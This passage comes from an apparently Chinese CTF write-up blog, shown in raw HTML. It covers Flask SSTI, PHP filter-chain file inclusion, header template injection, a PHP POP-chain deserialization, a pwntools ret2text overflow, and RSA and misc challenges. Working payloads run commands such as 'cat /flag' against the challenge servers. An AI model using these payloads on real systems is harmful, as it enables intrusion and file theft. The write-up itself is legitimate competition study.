class="params"><span class="string">&#x27;/send&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_message</span>():</span><br><span class="line">    filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">    message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(message) </span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;index?status=Send successfully!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> readmsg():</span><br><span class="line">        show = show_msg.replace(<span class="string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())</span><br><span class="line">        <span class="keyword">return</span> render_template_string(show)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;waf!!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>将下列两段请求包内容同时发送到intruder，payload位置分别为：</p><p>Post请求的?a=1（1为payload位置）</p><p>Get请求底部的a=1 (1为payload位置)</p><p>爆破时选择数字，随机数字，范围1-10，爆破次数1000次即可</p><p>在预览界面即可看到flag</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /app/send?a\<span class="punctuation">=</span><span class="number">1</span> HTTP/<span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">Host<span class="punctuation">:</span> node1.hgame.vidar.club<span class="punctuation">:</span><span class="number">32076</span></span><br><span class="line"></span><br><span class="line">User<span class="punctuation">-</span>Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> <span class="punctuation">(</span>Windows NT <span class="number">10.0</span><span class="punctuation">;</span> Win64<span class="punctuation">;</span> x64<span class="punctuation">)</span> AppleWebKit/<span class="number">537.36</span> <span class="punctuation">(</span>KHTML<span class="punctuation">,</span> like Gecko<span class="punctuation">)</span> Chrome/<span class="number">128.0</span>.<span class="number">6613.138</span> Safari/<span class="number">537.36</span></span><br><span class="line"></span><br><span class="line">Accept<span class="punctuation">:</span> text/html<span class="punctuation">,</span>application/xhtml<span class="punctuation">+</span>xml<span class="punctuation">,</span>application/xml<span class="punctuation">;</span>q<span class="punctuation">=</span><span class="number">0.9</span><span class="punctuation">,</span>image/avif<span class="punctuation">,</span>image/webp<span class="punctuation">,</span>image/apng<span class="punctuation">,</span>*/*<span class="punctuation">;</span>q<span class="punctuation">=</span><span class="number">0.8</span><span class="punctuation">,</span>application/signed<span class="punctuation">-</span>exchange<span class="punctuation">;</span>v<span class="punctuation">=</span>b3<span class="punctuation">;</span>q<span class="punctuation">=</span><span class="number">0.7</span></span><br><span class="line"></span><br><span class="line">Accept<span class="punctuation">-</span>Language<span class="punctuation">:</span> zh<span class="punctuation">-</span>CN<span class="punctuation">,</span>zh<span class="punctuation">;</span>q\<span class="punctuation">=</span><span class="number">0.9</span></span><br><span class="line"></span><br><span class="line">Accept<span class="punctuation">-</span>Encoding<span class="punctuation">:</span> gzip<span class="punctuation">,</span> deflate<span class="punctuation">,</span> br</span><br><span class="line"></span><br><span class="line">Content<span class="punctuation">-</span>Type<span class="punctuation">:</span> application/x<span class="punctuation">-</span>www<span class="punctuation">-</span>form<span class="punctuation">-</span>urlencoded</span><br><span class="line"></span><br><span class="line">Content<span class="punctuation">-</span>Length<span class="punctuation">:</span> <span class="number">115</span>  </span><br><span class="line"></span><br><span class="line">Connection<span class="punctuation">:</span> close</span><br><span class="line"></span><br><span class="line">Referer<span class="punctuation">:</span> http<span class="punctuation">:</span><span class="comment">//node1.hgame.vidar.club:32076/app/index</span></span><br><span class="line"></span><br><span class="line">Upgrade<span class="punctuation">-</span>Insecure<span class="punctuation">-</span>Requests<span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">message<span class="punctuation">=</span>&#123;&#123;lipsum.__globals__.__builtins__.__import__<span class="punctuation">(</span>&#x27;os&#x27;<span class="punctuation">)</span>.popen<span class="punctuation">(</span>&#x27;cat /f*&#x27;<span class="punctuation">)</span>.read<span class="punctuation">(</span><span class="punctuation">)</span>&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /app/read HTTP/<span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">Host<span class="punctuation">:</span> node1.hgame.vidar.club<span class="punctuation">:</span><span class="number">32076</span></span><br><span class="line"></span><br><span class="line">User<span class="punctuation">-</span>Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> <span class="punctuation">(</span>Windows NT <span class="number">10.0</span><span class="punctuation">;</span> Win64<span class="punctuation">;</span> x64<span class="punctuation">)</span> AppleWebKit/<span class="number">537.36</span> <span class="punctuation">(</span>KHTML<span class="punctuation">,</span> like Gecko<span class="punctuation">)</span> Chrome/<span class="number">128.0</span>.<span class="number">6613.138</span> Safari/<span class="number">537.36</span></span><br><span class="line"></span><br><span class="line">Accept<span class="punctuation">:</span> text/html<span class="punctuation">,</span>application/xhtml<span class="punctuation">+</span>xml<span class="punctuation">,</span>application/xml<span class="punctuation">;</span>q<span class="punctuation">=</span><span class="number">0.9</span><span class="punctuation">,</span>image/avif<span class="punctuation">,</span>image/webp<span class="punctuation">,</span>image/apng<span class="punctuation">,</span>*/*<span class="punctuation">;</span>q<span class="punctuation">=</span><span class="number">0.8</span><span class="punctuation">,</span>application/signed<span class="punctuation">-</span>exchange<span class="punctuation">;</span>v<span class="punctuation">=</span>b3<span class="punctuation">;</span>q<span class="punctuation">=</span><span class="number">0.7</span></span><br><span class="line"></span><br><span class="line">Accept<span class="punctuation">-</span>Language<span class="punctuation">:</span> zh<span class="punctuation">-</span>CN<span class="punctuation">,</span>zh<span class="punctuation">;</span>q<span class="punctuation">=</span><span class="number">0.9</span></span><br><span class="line"></span><br><span class="line">Accept<span class="punctuation">-</span>Encoding<span class="punctuation">:</span> gzip<span class="punctuation">,</span> deflate<span class="punctuation">,</span> br</span><br><span class="line"></span><br><span class="line">Connection<span class="punctuation">:</span> keep<span class="punctuation">-</span>alive</span><br><span class="line"></span><br><span class="line">Upgrade<span class="punctuation">-</span>Insecure<span class="punctuation">-</span>Requests<span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">a<span class="punctuation">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>​<img src="/img/hgame1/94f1925f6fb30f45915e4730f04a0107-20250212040544-op09tml.png" alt="94f1925f6fb30f45915e4730f04a0107">​</p><p>官方用的python脚本，还没学明白，但是复现了一下确实可行</p><p>‍</p><h2 id="Level-25-双面人派对（复现未完成）"><a href="#Level-25-双面人派对（复现未完成）" class="headerlink" title="Level 25 双面人派对（复现未完成）"></a>Level 25 双面人派对（复现未完成）</h2><p>​<img src="/img/hgame1/image-20250212010219-a6ro19g.png" alt="image">​</p>]]></content>
      
      
      <categories>
          
          <category> 一个web蒟蒻的成长日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>启航杯Seandictionary小队wp</title>
      <link href="/2025/01/26/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/"/>
      <url>/2025/01/26/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/</url>
      
        <content type="html"><![CDATA[<p>上次国赛的群里‍sean临时召集的</p><p>排名49&#x2F;536，感谢Seandictionary、Spreng、yolo带飞，本人负责做了web，出了一道社工，也学了一点东西</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="QHCTF-For-Year-2025-FINISHED"><a href="#QHCTF-For-Year-2025-FINISHED" class="headerlink" title="QHCTF For Year 2025 | FINISHED"></a>QHCTF For Year 2025 | FINISHED</h2><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image002-20250126093903-gg09w36.jpg">​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QHCTF&#123;FUN&#125;</span><br></pre></td></tr></table></figure><h2 id="请找出拍摄地所在位置-FINISHED"><a href="#请找出拍摄地所在位置-FINISHED" class="headerlink" title="请找出拍摄地所在位置 | FINISHED"></a>请找出拍摄地所在位置 | FINISHED</h2><p>首先定位大致范围</p><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image004-20250126093903-ogbtqo2.jpg">​</p><p>聊城或者柳城</p><p>然后根据对面的“街口果酱烧烤”进行定位即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QHCTF&#123;广西壮族自治区柳州市柳城县六广路与榕泉路交叉口&#125;</span><br></pre></td></tr></table></figure><h2 id="你能看懂这串未知的文字吗-FINISHED"><a href="#你能看懂这串未知的文字吗-FINISHED" class="headerlink" title="你能看懂这串未知的文字吗| FINISHED"></a>你能看懂这串未知的文字吗| FINISHED</h2><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image006-20250126093903-ezm3rh7.jpg">​</p><p>羊文对照得到szfpguwizgwesqzoaoerv</p><p>尝试凯撒，栅栏无效，猜测是维吉尼亚</p><p>LSB隐写得到qihangbeiiseasy作为key</p><p>解得QHCTF{cryptoveryeasybysheep}</p><h2 id="​启动！-FINISHED"><a href="#​启动！-FINISHED" class="headerlink" title="​启动！| FINISHED"></a>​启动！| FINISHED</h2><p>在135流找到url：<a href="http://101.126.66.65/log">http://101.126.66.65/log</a></p><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image008-20250126093903-mwn1yha.jpg">​</p><p>下载得到后门文件，内含flag</p><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image010-20250126093903-3t08nbs.jpg">​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QHCTF&#123;69b62b46-de2f-4ac2-81f7-234613d25cfb&#125;</span><br></pre></td></tr></table></figure><h2 id="PvzHE-FINISHED"><a href="#PvzHE-FINISHED" class="headerlink" title="PvzHE | FINISHED"></a>PvzHE | FINISHED</h2><p>按时间查找即可</p><p>PvzHE\images\ZombieNote1.png</p><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image012-20250126093903-9lzidgz.jpg">​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QHCTF&#123;300cef31-68d9-4b72-b49d-a7802da481a5&#125;</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Easy-RSA-FINISHED"><a href="#Easy-RSA-FINISHED" class="headerlink" title="Easy_RSA | FINISHED"></a>Easy_RSA | FINISHED</h2><p>之前的那题是真不会做，后面换的题又过于弱智</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">private_key = <span class="string">b&#x27;&#x27;&#x27;-----BEGIN RSA PRIVATE KEY-----\nMIICWwIBAAKBgQDIMXWdJOp5N7utubIOO0PmH7izlWzWT5g1LZ7O/c2klWIRuu1D\nJFzAHT/h3/Rx1JU3/NSY9g0E0ETZerI9PaEUNRIooCZm3Uy3LAPybVIOHpOP4bZ8\nL2I/GIf4i/Yt8MzLk/7r6au5pFh+ifl8G/ce6nSgh5LWs/jpjOv61pYsWwIDAQAB\nAoGAA4uAqiozrrbSb3aY1RCumJ4aLq/oL/lT2Ck5JTAwWog8ptS5C9XSgKJj9bN6\nCCP8CnRDLXw56cpoVbOLAXOcbQ+gga/V0SMNeyDsc7Rtk9psRH+BgnxdsL24KOQf\nx7qGNoWUqRCHZ7qafRbu0yGOkeS8Mi3EDr2iYedIDzOSW40CQQDOqgQTfZHjt1bV\n4b5UWFP/N8C4gaoB13xnfE5hh15keiQta2unXvCxvaOdYD1KuOIq9NLP7Uzl05/5\n5GXxx6avAkEA9/v7cYaJHoHQTyrHQrdEGrMSYcmA6o1+jDpoCPmY4kHg6Tz+8uR/\nRGXCdJ0ztBSOTP2r+Y1huZpqL6jzR4KAFQJAf/L06RhCPajh4zOLQe8ZuhZLhDAL\nEG7YP73PTUShJTYVteUe1pXKEVEmviW6bMvAgvXmmwMBK/10uyM0FpgUUwJASjSq\nAkeq4mkgB4Cajdk/VOn+9yoQHJ/onVeg6AagfBwQjFrHQ7Gib7ovnSupXBrGlj1W\nZ9+pvZt6aPaajex8HQJAXgHPmgnnZ/pjoAHVC65FOQS6Iw7yDjmrh5FI0ZAs1itB\nOOiZbvpiuVaOu/QDhcD//QCvlCNDwsGobYjTxVr6kg==\n-----END RSA PRIVATE KEY-----&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">encrypted_message = <span class="string">&quot;W3QljW92bNcoS6T7RcLQOlwnGk4Pl3YxLrx5UU+jyfh9yMjC0tOSZxcWjy4woZ2YKf+BlSFZN4hwbUeEF2k/RkmO3Ml5946X++cxnsgbkTP8IkLtmfR9O3tyOTvw3qcUW99aQX63aM0ha4QY1QCvyya7Tvm2jgy00zIF5cByHXM=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_message</span>(<span class="params">encrypted_message, private_key</span>):</span><br><span class="line">    key = RSA.import_key(private_key)</span><br><span class="line">    cipher = PKCS1_OAEP.new(key)</span><br><span class="line">    decrypted_message = cipher.decrypt(base64.b64decode(encrypted_message))</span><br><span class="line">    <span class="keyword">return</span> decrypted_message.decode()</span><br><span class="line"></span><br><span class="line">decrypted = decrypt_message(encrypted_message, private_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的消息:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(decrypted)</span><br><span class="line"></span><br><span class="line"><span class="comment"># QHCTF&#123;63bd6c44-3d5f-4acd-8aa1-99c8f1abaed5&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Easy-Pwn-FINISHED"><a href="#Easy-Pwn-FINISHED" class="headerlink" title="Easy_Pwn | FINISHED"></a>Easy_Pwn | FINISHED</h2><p>ret2text,0xGame做过，直接找&#x2F;bin&#x2F;sh的地址就行</p><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image014-20250126093903-85qjn13.jpg">​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">addr = <span class="string">&quot;challenge.qihangcup.cn:34879&quot;</span>.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">io=remote(addr[<span class="number">0</span>],addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">payload= <span class="string">b&#x27;A&#x27;</span>*<span class="number">80</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x4011CA</span>) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># QHCTF&#123;1f5cf23b-8f48-4b65-bedf-23db65262678&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="eazy-include-FINISHED"><a href="#eazy-include-FINISHED" class="headerlink" title="eazy-include | FINISHED"></a>eazy-include | FINISHED</h2><p>观察是文件包含，尝试双写绕过等方法后均无效</p><p>使用脚本生成payload如下,学会用新工具php_fliter_chain_generator.py</p><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image016-20250126093903-xenlqrf.jpg">​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/?<span class="number">0</span>=cat flag.php&amp;file=php:<span class="comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看源码即可</p><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image018-20250126093903-n0xh6rx.jpg">​</p><h2 id="web-ip-FINISHED"><a href="#web-ip-FINISHED" class="headerlink" title="web-ip | FINISHED"></a>web-ip | FINISHED</h2><p>使用hack-bar在请求头中添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1&#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>即可</p><h2 id="web-pop-FINISHED"><a href="#web-pop-FINISHED" class="headerlink" title="web-pop | FINISHED"></a>web-pop | FINISHED</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$aa</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;func = <span class="variable">$aa</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$aa</span>, <span class="variable">$bb</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$aa</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span> = <span class="variable">$bb</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Start</span>(<span class="keyword">new</span> <span class="title class_">Sec</span>(<span class="number">0</span>,<span class="number">0</span>));</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Sec</span>(<span class="keyword">new</span> <span class="title class_">Easy</span>(), <span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">| </span><br></pre></td></tr></table></figure><p>php反序列化，构造pop链传参即可</p><p>​<img src="/img/%E5%90%AF%E8%88%AA%E6%9D%AFCTF/clip_image020-20250126093903-az7koce.jpg">​</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Checker-FINISHED"><a href="#Checker-FINISHED" class="headerlink" title="Checker | FINISHED"></a>Checker | FINISHED</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">encrypted_flag = <span 